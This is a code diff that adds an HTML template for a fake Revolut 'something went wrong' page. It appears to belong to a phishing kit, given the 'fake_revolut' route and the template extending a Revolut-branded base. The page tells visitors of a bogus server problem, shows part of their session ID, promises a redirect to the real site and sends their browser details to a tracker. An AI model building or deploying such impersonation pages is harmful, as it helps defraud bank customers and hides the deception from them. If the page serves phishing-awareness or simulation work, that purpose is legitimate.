@@ -1,0 +1,57 @@
+{% extends "revolut/base.html" %}
+
+{% block title %}Oops! Something went wrong - Revolut{% endblock %}
+
+{% block content %}
+<div class="crash-container">
+    <div class="crash-card">
+        <div class="crash-icon">⚠️</div>
+        
+        <h1 class="crash-title">Oops! Something went wrong</h1>
+        
+        <p class="crash-message">
+            We're experiencing a temporary issue with our servers. 
+            This sometimes happens during high traffic periods or system maintenance.
+        </p>
+        
+        <div class="crash-details">
+            Error Code: REV_5XX_TEMP<br>
+            Time: <span id="error-time"></span><br>
+            Session: {{ session.get('revolut_session_id', 'N/A')[:8] }}...
+        </div>
+        
+        <p class="crash-message">
+            Please try reloading the page. If the problem persists, you'll be redirected to our main site.
+        </p>
+        
+        <a href="{{ url_for('fake_revolut.reload_after_crash') }}" class="reload-button" id="reload-btn">
+            🔄 Reload Page
+        </a>
+        
+        <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid var(--revolut-border-dark);">
+            <p style="font-size: 0.9rem; color: #9ca3af;">
+                If you continue to experience issues, please contact our support team.
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Show current time for error timestamp
+    document.getElementById('error-time').textContent = new Date().toLocaleString();
+    
+    // Add some loading effect to the reload button
+    document.getElementById('reload-btn').addEventListener('click', function(e) {
+        this.innerHTML = '⏳ Reloading...';
+        this.style.pointerEvents = 'none';
+    });
+    
+    // Track the crash page view
+    if (window.revolutTracker) {
+        window.revolutTracker.sendTrackingData('crash_page_viewed', {
+            timestamp: new Date().toISOString(),
+            user_agent: navigator.userAgent
+        });
+    }
+</script>
+{% endblock %}
